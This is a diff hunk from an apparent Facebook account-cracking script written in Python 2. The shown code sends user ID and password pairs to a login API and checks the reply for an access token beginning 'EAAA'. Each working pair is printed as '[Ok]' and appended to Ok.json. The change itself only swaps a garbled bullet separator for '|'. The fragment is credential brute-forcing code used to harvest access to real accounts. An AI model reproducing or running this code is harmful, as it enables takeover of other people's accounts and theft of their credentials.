@@ -204,7 +204,7 @@ def __menu__():
 				send=ses.get(api,params=param, headers=headers_)
 				if "access_token" in send.text and "EAAA" in send.text:
 					print '\r\033[1;92m[Ok] '+uid+'|'+pw+'        '
-					ok.append(uid+' â€¢ '+pw)
+					ok.append(uid+'|'+pw)
 					save = open('Ok.json','a') 
 					save.write(str(uid)+'|'+str(pw)+'\n')
 					save.close()
